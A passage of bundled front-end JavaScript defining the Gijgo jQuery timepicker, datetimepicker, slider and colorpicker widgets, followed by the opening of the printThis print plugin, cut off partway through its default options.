      button: "gj-button-md"
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-timepicker gj-timepicker-bootstrap gj-unselectable input-group",
      input: "form-control",
      clock: "gj-picker gj-picker-bootstrap timepicker",
      footer: "modal-footer",
      button: "btn btn-default"
    },
    iconsLibrary: "glyphicons"
  },
  bootstrap4: {
    style: {
      wrapper: "gj-timepicker gj-timepicker-bootstrap gj-unselectable input-group",
      input: "form-control border",
      clock: "gj-picker gj-picker-bootstrap timepicker",
      footer: "modal-footer",
      button: "btn btn-default"
    }
  }
}, gj.timepicker.methods = {
  init: function (e) {
    return gj.picker.widget.prototype.init.call(this, e, "timepicker"), this;
  },
  initialize: function () {},
  initMouse: function (e, t, n, i) {
    e.off(), e.on("mousedown", gj.timepicker.methods.mouseDownHandler(t, n)), e.on("mousemove", gj.timepicker.methods.mouseMoveHandler(t, n, i)), e.on("mouseup", gj.timepicker.methods.mouseUpHandler(t, n, i));
  },
  createPicker: function (t) {
    var e,
      n = t.data(),
      i = $('<div role="picker" />').addClass(n.style.clock).attr("guid", t.attr("data-guid")),
      o = $('<div role="hour" />'),
      r = $('<div role="minute" />'),
      a = $('<div role="header" />'),
      s = $('<div role="mode" />'),
      l = $('<div role="body" />'),
      d = $('<button class="' + n.style.button + '">' + gj.core.messages[n.locale].ok + "</button>"),
      c = $('<button class="' + n.style.button + '">' + gj.core.messages[n.locale].cancel + "</button>"),
      u = $('<div role="footer" class="' + n.style.footer + '" />');
    return !(e = gj.core.parseDate(n.value, n.format, n.locale)) || isNaN(e.getTime()) ? e = new Date() : t.attr("hours", e.getHours()), gj.timepicker.methods.initMouse(l, t, i, n), n.header && (o.on("click", function () {
      gj.timepicker.methods.renderHours(t, i, n);
    }), r.on("click", function () {
      gj.timepicker.methods.renderMinutes(t, i, n);
    }), a.append(o).append(":").append(r), "ampm" === n.mode && (s.append($('<span role="am">' + gj.core.messages[n.locale].am + "</span>").on("click", function () {
      var e = gj.timepicker.methods.getHour(i);
      i.attr("mode", "am"), $(this).addClass("selected"), $(this).parent().children('[role="pm"]').removeClass("selected"), 12 <= e && i.attr("hour", e - 12), n.modal || (clearTimeout(t.timeout), t.focus());
    })), s.append("<br />"), s.append($('<span role="pm">' + gj.core.messages[n.locale].pm + "</span>").on("click", function () {
      var e = gj.timepicker.methods.getHour(i);
      i.attr("mode", "pm"), $(this).addClass("selected"), $(this).parent().children('[role="am"]').removeClass("selected"), e < 12 && i.attr("hour", e + 12), n.modal || (clearTimeout(t.timeout), t.focus());
    })), a.append(s)), i.append(a)), i.append(l), n.footer && (c.on("click", function () {
      t.close();
    }), u.append(c), d.on("click", gj.timepicker.methods.setTime(t, i)), u.append(d), i.append(u)), i.hide(), $("body").append(i), n.modal && (i.wrapAll('<div role="modal" class="' + n.style.modal + '"/>'), gj.core.center(i)), i;
  },
  getHour: function (e) {
    return parseInt(e.attr("hour"), 10) || 0;
  },
  getMinute: function (e) {
    return parseInt(e.attr("minute"), 10) || 0;
  },
  setTime: function (a, s) {
    return function () {
      var e = gj.timepicker.methods.getHour(s),
        t = gj.timepicker.methods.getMinute(s),
        n = s.attr("mode"),
        i = new Date(0, 0, 0, 12 === e && "am" === n ? 0 : e, t),
        o = a.data(),
        r = gj.core.formatDate(i, o.format, o.locale);
      a.value(r), a.close();
    };
  },
  getPointerValue: function (e, t, n) {
    var i,
      o,
      r = Math.atan2(128 - e, 128 - t) / Math.PI * 180;
    switch (r < 0 && (r = 360 + r), n) {
      case "ampm":
        return 0 === (i = 12 - Math.round(12 * r / 360)) ? 12 : i;
      case "24hr":
        return o = Math.sqrt(Math.pow(128 - e, 2) + Math.pow(128 - t, 2)), 0 === (i = 12 - Math.round(12 * r / 360)) && (i = 12), o < 96 && (i = 12 === i ? 0 : i + 12), i;
      case "minutes":
        return 60 === (i = Math.round(60 - 60 * r / 360)) ? 0 : i;
    }
  },
  updateArrow: function (e, t, n, i) {
    var o,
      r,
      a = t.mouseX(e),
      s = t.mouseY(e),
      l = window.scrollY || window.pageYOffset || 0,
      d = window.scrollX || window.pageXOffset || 0;
    o = e.target.getBoundingClientRect(), "hours" == i.dialMode ? (r = gj.timepicker.methods.getPointerValue(a - d - o.left, s - l - o.top, i.mode), n.attr("hour", "ampm" === i.mode && "pm" === n.attr("mode") && r < 12 ? r + 12 : r)) : "minutes" == i.dialMode && (r = gj.timepicker.methods.getPointerValue(a - d - o.left, s - l - o.top, "minutes"), n.attr("minute", r)), gj.timepicker.methods.update(t, n, i);
  },
  update: function (e, t, n) {
    var i, o, r, a, s, l;
    i = gj.timepicker.methods.getHour(t), o = gj.timepicker.methods.getMinute(t), r = t.find('[role="arrow"]'), "hours" == n.dialMode && (0 == i || 12 < i) && "24hr" === n.mode ? r.css("width", "calc(50% - 52px)") : r.css("width", "calc(50% - 20px)"), "hours" == n.dialMode ? r.css("transform", "rotate(" + (30 * i - 90).toString() + "deg)") : r.css("transform", "rotate(" + (6 * o - 90).toString() + "deg)"), r.show(), a = "ampm" === n.mode && 12 < i ? i - 12 : 0 == i ? 12 : i, (l = t.find('[role="body"] span')).removeClass("selected"), l.filter(function (e) {
      return "hours" == n.dialMode ? parseInt($(this).text(), 10) == a : parseInt($(this).text(), 10) == o;
    }).addClass("selected"), n.header && ((s = t.find('[role="header"]')).find('[role="hour"]').text(a), s.find('[role="minute"]').text(gj.core.pad(o)), "ampm" === n.mode && (12 <= i ? (s.find('[role="pm"]').addClass("selected"), s.find('[role="am"]').removeClass("selected")) : (s.find('[role="am"]').addClass("selected"), s.find('[role="pm"]').removeClass("selected"))));
  },
  mouseDownHandler: function (t, e) {
    return function (e) {
      t.mouseMove = !0;
    };
  },
  mouseMoveHandler: function (t, n, i) {
    return function (e) {
      t.mouseMove && gj.timepicker.methods.updateArrow(e, t, n, i);
    };
  },
  mouseUpHandler: function (t, n, i) {
    return function (e) {
      gj.timepicker.methods.updateArrow(e, t, n, i), t.mouseMove = !1, i.modal || (clearTimeout(t.timeout), t.focus()), "hours" == i.dialMode ? setTimeout(function () {
        gj.timepicker.events.select(t, "hour"), gj.timepicker.methods.renderMinutes(t, n, i);
      }, 1e3) : "minutes" == i.dialMode && (!0 !== i.footer && !1 !== i.autoClose && gj.timepicker.methods.setTime(t, n)(), gj.timepicker.events.select(t, "minute"));
    };
  },
  renderHours: function (e, t, n) {
    var i,
      o = t.find('[role="body"]');
    clearTimeout(e.timeout), o.empty(), (i = $('<div role="dial"></div>')).append('<div role="arrow" style="transform: rotate(-90deg); display: none;"><div class="arrow-begin"></div><div class="arrow-end"></div></div>'), i.append('<span role="hour" style="transform: translate(54px, -93.5307px);">1</span>'), i.append('<span role="hour" style="transform: translate(93.5307px, -54px);">2</span>'), i.append('<span role="hour" style="transform: translate(108px, 0px);">3</span>'), i.append('<span role="hour" style="transform: translate(93.5307px, 54px);">4</span>'), i.append('<span role="hour" style="transform: translate(54px, 93.5307px);">5</span>'), i.append('<span role="hour" style="transform: translate(6.61309e-15px, 108px);">6</span>'), i.append('<span role="hour" style="transform: translate(-54px, 93.5307px);">7</span>'), i.append('<span role="hour" style="transform: translate(-93.5307px, 54px);">8</span>'), i.append('<span role="hour" style="transform: translate(-108px, 1.32262e-14px);">9</span>'), i.append('<span role="hour" style="transform: translate(-93.5307px, -54px);">10</span>'), i.append('<span role="hour" style="transform: translate(-54px, -93.5307px);">11</span>'), i.append('<span role="hour" style="transform: translate(-1.98393e-14px, -108px);">12</span>'), "24hr" === n.mode && (i.append('<span role="hour" style="transform: translate(38px, -65.8179px);">13</span>'), i.append('<span role="hour" style="transform: translate(65.8179px, -38px);">14</span>'), i.append('<span role="hour" style="transform: translate(76px, 0px);">15</span>'), i.append('<span role="hour" style="transform: translate(65.8179px, 38px);">16</span>'), i.append('<span role="hour" style="transform: translate(38px, 65.8179px);">17</span>'), i.append('<span role="hour" style="transform: translate(4.65366e-15px, 76px);">18</span>'), i.append('<span role="hour" style="transform: translate(-38px, 65.8179px);">19</span>'), i.append('<span role="hour" style="transform: translate(-65.8179px, 38px);">20</span>'), i.append('<span role="hour" style="transform: translate(-76px, 9.30732e-15px);">21</span>'), i.append('<span role="hour" style="transform: translate(-65.8179px, -38px);">22</span>'), i.append('<span role="hour" style="transform: translate(-38px, -65.8179px);">23</span>'), i.append('<span role="hour" style="transform: translate(-1.3961e-14px, -76px);">00</span>')), o.append(i), t.find('[role="header"] [role="hour"]').addClass("selected"), t.find('[role="header"] [role="minute"]').removeClass("selected"), n.dialMode = "hours", gj.timepicker.methods.update(e, t, n);
  },
  renderMinutes: function (e, t, n) {
    var i = t.find('[role="body"]');
    clearTimeout(e.timeout), i.empty(), $dial = $('<div role="dial"></div>'), $dial.append('<div role="arrow" style="transform: rotate(-90deg); display: none;"><div class="arrow-begin"></div><div class="arrow-end"></div></div>'), $dial.append('<span role="hour" style="transform: translate(54px, -93.5307px);">5</span>'), $dial.append('<span role="hour" style="transform: translate(93.5307px, -54px);">10</span>'), $dial.append('<span role="hour" style="transform: translate(108px, 0px);">15</span>'), $dial.append('<span role="hour" style="transform: translate(93.5307px, 54px);">20</span>'), $dial.append('<span role="hour" style="transform: translate(54px, 93.5307px);">25</span>'), $dial.append('<span role="hour" style="transform: translate(6.61309e-15px, 108px);">30</span>'), $dial.append('<span role="hour" style="transform: translate(-54px, 93.5307px);">35</span>'), $dial.append('<span role="hour" style="transform: translate(-93.5307px, 54px);">40</span>'), $dial.append('<span role="hour" style="transform: translate(-108px, 1.32262e-14px);">45</span>'), $dial.append('<span role="hour" style="transform: translate(-93.5307px, -54px);">50</span>'), $dial.append('<span role="hour" style="transform: translate(-54px, -93.5307px);">55</span>'), $dial.append('<span role="hour" style="transform: translate(-1.98393e-14px, -108px);">00</span>'), i.append($dial), t.find('[role="header"] [role="hour"]').removeClass("selected"), t.find('[role="header"] [role="minute"]').addClass("selected"), n.dialMode = "minutes", gj.timepicker.methods.update(e, t, n);
  },
  open: function (e) {
    var t,
      n,
      i = e.data(),
      o = $("body").find('[role="picker"][guid="' + e.attr("data-guid") + '"]');
    return n = (t = e.value() ? gj.core.parseDate(e.value(), i.format, i.locale) : new Date()).getHours(), "ampm" === i.mode && o.attr("mode", 12 < n ? "pm" : "am"), o.attr("hour", n), o.attr("minute", t.getMinutes()), gj.timepicker.methods.renderHours(e, o, i), gj.picker.widget.prototype.open.call(e, "timepicker"), e;
  },
  value: function (e, t) {
    return e.data(), void 0 === t ? e.val() : (e.val(t), gj.timepicker.events.change(e), e);
  }
}, gj.timepicker.events = {
  change: function (e) {
    return e.triggerHandler("change");
  },
  select: function (e, t) {
    return e.triggerHandler("select", [t]);
  },
  open: function (e) {
    return e.triggerHandler("open");
  },
  close: function (e) {
    return e.triggerHandler("close");
  }
}, gj.timepicker.widget = function (e, t) {
  var n = gj.timepicker.methods;
  return this.mouseMove = !1, this.value = function (e) {
    return n.value(this, e);
  }, this.destroy = function () {
    return gj.picker.widget.prototype.destroy.call(this, "timepicker");
  }, this.open = function () {
    return gj.timepicker.methods.open(this);
  }, this.close = function () {
    return gj.picker.widget.prototype.close.call(this, "timepicker");
  }, $.extend(e, this), "true" !== e.attr("data-timepicker") && n.init.call(e, t), e;
}, gj.timepicker.widget.prototype = new gj.picker.widget(), gj.timepicker.widget.constructor = gj.timepicker.widget, jQuery.fn.timepicker = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.timepicker.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.timepicker.widget(this, e);
  }
}, gj.datetimepicker = {
  plugins: {},
  messages: {
    "en-us": {}
  }
}, gj.datetimepicker.config = {
  base: {
    datepicker: gj.datepicker.config.base,
    timepicker: gj.timepicker.config.base,
    uiLibrary: "materialdesign",
    value: void 0,
    format: "HH:MM mm/dd/yyyy",
    width: void 0,
    modal: !1,
    footer: !1,
    size: "default",
    locale: "en-us",
    icons: {},
    style: {
      calendar: "gj-picker gj-picker-md datetimepicker gj-unselectable"
    }
  },
  bootstrap: {
    style: {
      calendar: "gj-picker gj-picker-bootstrap datetimepicker gj-unselectable"
    },
    iconsLibrary: "glyphicons"
  },
  bootstrap4: {
    style: {
      calendar: "gj-picker gj-picker-bootstrap datetimepicker gj-unselectable"
    }
  }
}, gj.datetimepicker.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "datetimepicker"), this.attr("data-datetimepicker", "true"), gj.datetimepicker.methods.initialize(this), this;
  },
  getConfig: function (e, t) {
    var n = gj.widget.prototype.getConfig.call(this, e, t);
    return uiLibrary = e.hasOwnProperty("uiLibrary") ? e.uiLibrary : n.uiLibrary, gj.datepicker.config[uiLibrary] && $.extend(!0, n.datepicker, gj.datepicker.config[uiLibrary]), gj.timepicker.config[uiLibrary] && $.extend(!0, n.timepicker, gj.timepicker.config[uiLibrary]), iconsLibrary = e.hasOwnProperty("iconsLibrary") ? e.iconsLibrary : n.iconsLibrary, gj.datepicker.config[iconsLibrary] && $.extend(!0, n.datepicker, gj.datepicker.config[iconsLibrary]), gj.timepicker.config[iconsLibrary] && $.extend(!0, n.timepicker, gj.timepicker.config[iconsLibrary]), n;
  },
  initialize: function (o) {
    var r,
      e,
      t,
      n,
      i,
      a,
      s,
      l,
      d = o.data();
    d.datepicker.uiLibrary = d.uiLibrary, d.datepicker.iconsLibrary = d.iconsLibrary, d.datepicker.width = d.width, d.datepicker.format = d.format, d.datepicker.locale = d.locale, d.datepicker.modal = d.modal, d.datepicker.footer = d.footer, d.datepicker.style.calendar = d.style.calendar, d.datepicker.value = d.value, d.datepicker.size = d.size, d.datepicker.autoClose = !1, gj.datepicker.methods.initialize(o, d.datepicker), o.on("select", function (e, t) {
      var n, i;
      "day" === t ? gj.datetimepicker.methods.createShowHourHandler(o, r, d)() : "minute" === t && r.attr("selectedDay") && !0 !== d.footer && (selectedDay = r.attr("selectedDay").split("-"), n = new Date(selectedDay[0], selectedDay[1], selectedDay[2], r.attr("hour") || 0, r.attr("minute") || 0), i = gj.core.formatDate(n, d.format, d.locale), o.val(i), gj.datetimepicker.events.change(o), gj.datetimepicker.methods.close(o));
    }), o.on("open", function () {
      var e = r.children('[role="header"]');
      e.find('[role="calendarMode"]').addClass("selected"), e.find('[role="clockMode"]').removeClass("selected");
    }), r = $("body").find('[role="calendar"][guid="' + o.attr("data-guid") + '"]'), i = d.value ? gj.core.parseDate(d.value, d.format, d.locale) : new Date(), r.attr("hour", i.getHours()), r.attr("minute", i.getMinutes()), d.timepicker.uiLibrary = d.uiLibrary, d.timepicker.iconsLibrary = d.iconsLibrary, d.timepicker.format = d.format, d.timepicker.locale = d.locale, d.timepicker.header = !0, d.timepicker.footer = d.footer, d.timepicker.size = d.size, d.timepicker.mode = "24hr", d.timepicker.autoClose = !1, e = $('<div role="header" />'), (t = $('<div role="date" class="selected" />')).on("click", gj.datetimepicker.methods.createShowDateHandler(o, r, d)), t.html(gj.core.formatDate(new Date(), "ddd, mmm dd", d.locale)), e.append(t), a = $('<div role="switch"></div>'), (s = $('<i class="gj-icon selected" role="calendarMode">event</i>')).on("click", gj.datetimepicker.methods.createShowDateHandler(o, r, d)), a.append(s), (n = $('<div role="time" />')).append($('<div role="hour" />').on("click", gj.datetimepicker.methods.createShowHourHandler(o, r, d)).html(gj.core.formatDate(new Date(), "HH", d.locale))), n.append(":"), n.append($('<div role="minute" />').on("click", gj.datetimepicker.methods.createShowMinuteHandler(o, r, d)).html(gj.core.formatDate(new Date(), "MM", d.locale))), a.append(n), (l = $('<i class="gj-icon" role="clockMode">clock</i>')).on("click", gj.datetimepicker.methods.createShowHourHandler(o, r, d)), a.append(l), e.append(a), r.prepend(e);
  },
  createShowDateHandler: function (n, i, o) {
    return function (e) {
      var t = i.children('[role="header"]');
      t.find('[role="calendarMode"]').addClass("selected"), t.find('[role="date"]').addClass("selected"), t.find('[role="clockMode"]').removeClass("selected"), t.find('[role="hour"]').removeClass("selected"), t.find('[role="minute"]').removeClass("selected"), gj.datepicker.methods.renderMonth(n, i, o.datepicker);
    };
  },
  createShowHourHandler: function (t, n, i) {
    return function () {
      var e = n.children('[role="header"]');
      e.find('[role="calendarMode"]').removeClass("selected"), e.find('[role="date"]').removeClass("selected"), e.find('[role="clockMode"]').addClass("selected"), e.find('[role="hour"]').addClass("selected"), e.find('[role="minute"]').removeClass("selected"), gj.timepicker.methods.initMouse(n.children('[role="body"]'), t, n, i.timepicker), gj.timepicker.methods.renderHours(t, n, i.timepicker);
    };
  },
  createShowMinuteHandler: function (t, n, i) {
    return function () {
      var e = n.children('[role="header"]');
      e.find('[role="calendarMode"]').removeClass("selected"), e.find('[role="date"]').removeClass("selected"), e.find('[role="clockMode"]').addClass("selected"), e.find('[role="hour"]').removeClass("selected"), e.find('[role="minute"]').addClass("selected"), gj.timepicker.methods.initMouse(n.children('[role="body"]'), t, n, i.timepicker), gj.timepicker.methods.renderMinutes(t, n, i.timepicker);
    };
  },
  close: function (e) {
    var t = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]');
    t.hide(), t.closest('div[role="modal"]').hide();
  },
  value: function (e, t) {
    var n,
      i,
      o,
      r = e.data();
    return void 0 === t ? e.val() : ((i = gj.core.parseDate(t, r.format, r.locale)) ? (n = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]'), gj.datepicker.methods.dayClickHandler(e, n, r, i)(), o = i.getHours(), "ampm" === r.mode && n.attr("mode", 12 < o ? "pm" : "am"), n.attr("hour", o), n.attr("minute", i.getMinutes()), e.val(t)) : e.val(""), e);
  },
  destroy: function (e) {
    var t = e.data(),
      n = e.parent(),
      i = $("body").find('[role="calendar"][guid="' + e.attr("data-guid") + '"]');
    return t && (e.off(), 0 < i.parent('[role="modal"]').length && i.unwrap(), i.remove(), e.removeData(), e.removeAttr("data-type").removeAttr("data-guid").removeAttr("data-datetimepicker"), e.removeClass(), n.children('[role="right-icon"]').remove(), e.unwrap()), e;
  }
}, gj.datetimepicker.events = {
  change: function (e) {
    return e.triggerHandler("change");
  }
}, gj.datetimepicker.widget = function (e, t) {
  var n = gj.datetimepicker.methods;
  return this.mouseMove = !1, this.value = function (e) {
    return n.value(this, e);
  }, this.open = function () {
    gj.datepicker.methods.open(this, this.data().datepicker);
  }, this.close = function () {
    gj.datepicker.methods.close(this);
  }, this.destroy = function () {
    return n.destroy(this);
  }, $.extend(e, this), "true" !== e.attr("data-datetimepicker") && n.init.call(e, t), e;
}, gj.datetimepicker.widget.prototype = new gj.widget(), gj.datetimepicker.widget.constructor = gj.datetimepicker.widget, gj.datetimepicker.widget.prototype.getConfig = gj.datetimepicker.methods.getConfig, jQuery.fn.datetimepicker = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.datetimepicker.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.datetimepicker.widget(this, e);
  }
}, gj.slider = {
  plugins: {},
  messages: {
    "en-us": {}
  }
}, gj.slider.config = {
  base: {
    min: 0,
    max: 100,
    width: void 0,
    uiLibrary: "materialdesign",
    value: void 0,
    icons: {},
    style: {
      wrapper: "gj-slider gj-slider-md",
      progress: void 0,
      track: void 0
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-slider gj-slider-bootstrap gj-slider-bootstrap-3",
      progress: "progress-bar",
      track: "progress"
    }
  },
  bootstrap4: {
    style: {
      wrapper: "gj-slider gj-slider-bootstrap gj-slider-bootstrap-4",
      progress: "progress-bar",
      track: "progress"
    }
  }
}, gj.slider.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "slider"), this.attr("data-slider", "true"), gj.slider.methods.initialize(this, this.data()), this;
  },
  initialize: function (e, t) {
    var n, i, o, r;
    e[0].style.display = "none", "wrapper" !== e[0].parentElement.attributes.role ? ((n = document.createElement("div")).setAttribute("role", "wrapper"), e[0].parentNode.insertBefore(n, e[0]), n.appendChild(e[0])) : n = e[0].parentElement, t.width && (n.style.width = t.width + "px"), gj.core.addClasses(n, t.style.wrapper), null == (i = e[0].querySelector('[role="track"]')) && ((i = document.createElement("div")).setAttribute("role", "track"), n.appendChild(i)), gj.core.addClasses(i, t.style.track), null == (o = e[0].querySelector('[role="handle"]')) && ((o = document.createElement("div")).setAttribute("role", "handle"), n.appendChild(o)), null == (r = e[0].querySelector('[role="progress"]')) && ((r = document.createElement("div")).setAttribute("role", "progress"), n.appendChild(r)), gj.core.addClasses(r, t.style.progress), t.value || (t.value = t.min), gj.slider.methods.value(e, t, t.value), gj.documentManager.subscribeForEvent("mouseup", e.data("guid"), gj.slider.methods.createMouseUpHandler(e, o, t)), o.addEventListener("mousedown", gj.slider.methods.createMouseDownHandler(o, t)), gj.documentManager.subscribeForEvent("mousemove", e.data("guid"), gj.slider.methods.createMouseMoveHandler(e, i, o, r, t)), o.addEventListener("click", function (e) {
      e.stopPropagation();
    }), n.addEventListener("click", gj.slider.methods.createClickHandler(e, i, o, t));
  },
  createClickHandler: function (a, s, l, d) {
    return function (e) {
      var t, n, i, o, r;
      "true" !== l.getAttribute("drag") && (t = gj.core.position(a[0].parentElement), n = new gj.widget().mouseX(e) - t.left, i = gj.core.width(l) / 2, o = gj.core.width(s) / (d.max - d.min), r = Math.round((n - i) / o) + d.min, gj.slider.methods.value(a, d, r));
    };
  },
  createMouseUpHandler: function (t, n, e) {
    return function (e) {
      "true" === n.getAttribute("drag") && (n.setAttribute("drag", "false"), gj.slider.events.change(t));
    };
  },
  createMouseDownHandler: function (t, e) {
    return function (e) {
      t.setAttribute("drag", "true");
    };
  },
  createMouseMoveHandler: function (l, d, c, e, u) {
    return function (e) {
      var t, n, i, o, r, a, s;
      "true" === c.getAttribute("drag") && (t = gj.core.position(l[0].parentElement), n = new gj.widget().mouseX(e) - t.left, i = gj.core.width(d), o = gj.core.width(c) / 2, r = i / (u.max - u.min), a = (u.value - u.min) * r, o <= n && n <= i + o && (a + r / 2 < n || n < a - r / 2) && (s = Math.round((n - o) / r) + u.min, gj.slider.methods.value(l, u, s)));
    };
  },
  value: function (e, t, n) {
    var i, o;
    return void 0 === n ? e[0].value : (e[0].setAttribute("value", n), t.value = n, o = e.parent().children('[role="track"]')[0], i = gj.core.width(o) / (t.max - t.min), e.parent().children('[role="handle"]')[0].style.left = (n - t.min) * i + "px", e.parent().children('[role="progress"]')[0].style.width = (n - t.min) * i + "px", gj.slider.events.slide(e, n), e);
  },
  destroy: function (e) {
    var t = e.data(),
      n = e.parent();
    return t && (n.children('[role="track"]').remove(), n.children('[role="handle"]').remove(), n.children('[role="progress"]').remove(), e.unwrap(), e.off(), e.removeData(), e.removeAttr("data-type").removeAttr("data-guid").removeAttr("data-slider"), e.removeClass(), e.show()), e;
  }
}, gj.slider.events = {
  change: function (e) {
    return e.triggerHandler("change");
  },
  slide: function (e, t) {
    return e.triggerHandler("slide", [t]);
  }
}, gj.slider.widget = function (e, t) {
  var n = gj.slider.methods;
  return this.value = function (e) {
    return n.value(this, this.data(), e);
  }, this.destroy = function () {
    return n.destroy(this);
  }, $.extend(e, this), "true" !== e.attr("data-slider") && n.init.call(e, t), e;
}, gj.slider.widget.prototype = new gj.widget(), gj.slider.widget.constructor = gj.slider.widget, jQuery.fn.slider = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.slider.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.slider.widget(this, e);
  }
}, gj.colorpicker = {
  plugins: {},
  messages: {
    "en-us": {}
  }
}, gj.colorpicker.config = {
  base: {
    uiLibrary: "materialdesign",
    value: void 0,
    icons: {
      rightIcon: '<i class="gj-icon">event</i>'
    },
    style: {
      modal: "gj-modal",
      wrapper: "gj-colorpicker gj-colorpicker-md gj-unselectable",
      input: "gj-textbox-md",
      picker: "gj-picker gj-picker-md colorpicker gj-unselectable",
      footer: "",
      button: "gj-button-md"
    }
  },
  bootstrap: {
    style: {}
  },
  bootstrap4: {
    style: {}
  }
}, gj.colorpicker.methods = {
  init: function (e) {
    return gj.picker.widget.prototype.init.call(this, e, "colorpicker"), gj.colorpicker.methods.initialize(this), this;
  },
  initialize: function (e) {},
  createPicker: function (e, t) {
    var n = $('<div role="picker" />').addClass(t.style.picker).attr("guid", e.attr("data-guid"));
    return n.html("test"), n.hide(), $("body").append(n), n;
  },
  open: function (e) {
    return e.val() && e.value(e.val()), gj.picker.widget.prototype.open.call(e, "colorpicker");
  }
}, gj.colorpicker.events = {
  change: function (e) {
    return e.triggerHandler("change");
  },
  select: function (e) {
    return e.triggerHandler("select");
  },
  open: function (e) {
    return e.triggerHandler("open");
  },
  close: function (e) {
    return e.triggerHandler("close");
  }
}, gj.colorpicker.widget = function (e, t) {
  var n = gj.colorpicker.methods;
  return this.value = function (e) {
    return n.value(this, e);
  }, this.destroy = function () {
    return gj.picker.widget.prototype.destroy.call(this, "colorpicker");
  }, this.open = function () {
    return n.open(this);
  }, this.close = function () {
    return gj.picker.widget.prototype.close.call(this, "colorpicker");
  }, $.extend(e, this), "true" !== e.attr("data-colorpicker") && n.init.call(e, t), e;
}, gj.colorpicker.widget.prototype = new gj.picker.widget(), gj.colorpicker.widget.constructor = gj.colorpicker.widget, jQuery.fn.colorpicker = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.colorpicker.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.colorpicker.widget(this, e);
  }
}, function (y) {
  function b(e, t) {
    t && e.append(t.jquery ? t.clone() : t);
  }
  function w(e, t, n) {
    var i,
      o,
      r,
      a = t.clone(n.formValues);
    n.formValues && (i = a, o = "select, textarea", r = t.find(o), i.find(o).each(function (e, t) {
      y(t).val(r.eq(e).val());
    })), n.removeScripts && a.find("script").remove(), n.printContainer ? a.appendTo(e) : a.each(function () {
      y(this).children().appendTo(e);
    });
  }
  var x;
  y.fn.printThis = function (e) {
    x = y.extend({}, y.fn.printThis.defaults, e);
    var m = this instanceof jQuery ? this : y(this),
      t = "printThis-" + new Date().getTime();
    if (window.location.hostname !== document.domain && navigator.userAgent.match(/msie/i)) {
      var n = 'javascript:document.write("<head><script>document.domain=\\"' + document.domain + '\\";<\/script></head><body></body>")',
        i = document.createElement("iframe");
      i.name = "printIframe", i.id = t, i.className = "MSIE", document.body.appendChild(i), i.src = n;
    } else {
      y("<iframe id='" + t + "' name='printIframe' />").appendTo("body");
    }
    var v = y("#" + t);
    x.debug || v.css({
      position: "absolute",
      width: "0px",
      height: "0px",
      left: "-600px",
      top: "-600px"
    }), "function" == typeof x.beforePrint && x.beforePrint(), setTimeout(function () {
      var e, t, n, i;
      x.doctypeString && (e = v, t = x.doctypeString, (i = (n = (n = e.get(0)).contentWindow || n.contentDocument || n).document || n.contentDocument || n).open(), i.write(t), i.close());
      var o,
        r = v.contents(),
        a = r.find("head"),
        s = r.find("body"),
        l = y("base");
      o = !0 === x.base && 0 < l.length ? l.attr("href") : "string" == typeof x.base ? x.base : document.location.protocol + "//" + document.location.host, a.append('<base href="' + o + '">'), x.importCSS && y("link[rel=stylesheet]").each(function () {
        var e = y(this).attr("href");
        if (e) {
          var t = y(this).attr("media") || "all";
          a.append("<link type='text/css' rel='stylesheet' href='" + e + "' media='" + t + "'>");
        }
      }), x.importStyle && y("style").each(function () {
        a.append(this.outerHTML);
      }), x.pageTitle && a.append("<title>" + x.pageTitle + "</title>"), x.loadCSS && (y.isArray(x.loadCSS) ? jQuery.each(x.loadCSS, function (e, t) {
        a.append("<link type='text/css' rel='stylesheet' href='" + this + "'>");
      }) : a.append("<link type='text/css' rel='stylesheet' href='" + x.loadCSS + "'>"));
      var d = y("html")[0];
      r.find("html").prop("style", d.style.cssText);
      var c,
        u,
        p,
        h = x.copyTagClasses;
      if (h && (-1 !== (h = !0 === h ? "bh" : h).indexOf("b") && s.addClass(y("body")[0].className), -1 !== h.indexOf("h") && r.find("html").addClass(d.className)), b(s, x.header), x.canvas) {
        var f = 0;
        m.find("canvas").addBack("canvas").each(function () {
          y(this).attr("data-printthis", f++);
        });
      }
      if (w(s, m, x), x.canvas && s.find("canvas").each(function () {
        var e = y(this).data("printthis"),
          t = y('[data-printthis="' + e + '"]');
        this.getContext("2d").drawImage(t[0], 0, 0), y.isFunction(y.fn.removeAttr) ? t.removeAttr("data-printthis") : y.each(t, function (e, t) {
          t.removeAttribute("data-printthis");
        });
      }), x.removeInline) {
        var g = x.removeInlineSelector || "*";
        y.isFunction(y.removeAttr) ? s.find(g).removeAttr("style") : s.find(g).attr("style", "");
      }
      b(s, x.footer), c = v, u = x.beforePrintEvent, p = (p = c.get(0)).contentWindow || p.contentDocument || p, "function" == typeof u && ("matchMedia" in p ? p.matchMedia("print").addListener(function (e) {
        e.matches && u();
      }) : p.onbeforeprint = u), setTimeout(function () {
        v.hasClass("MSIE") ? (window.frames.printIframe.focus(), a.append("<script>  window.print(); <\/script>")) : document.queryCommandSupported("print") ? v[0].contentWindow.document.execCommand("print", !1, null) : (v[0].contentWindow.focus(), v[0].contentWindow.print()), x.debug || setTimeout(function () {
          v.remove();
        }, 1e3), "function" == typeof x.afterPrint && x.afterPrint();
      }, x.printDelay);
    }, 333);
  }, y.fn.printThis.defaults = {
    debug: !1,
    importCSS: !0,
    importStyle: !1,
    printContainer: !0,
    loadCSS: "",
    pageTitle: "",
    removeInline: !1,
    removeInlineSelector: "*",
    printDelay: 333,
    header: null,
    footer: null,
    base: !1,
    formValues: !0,
    canvas: !1,
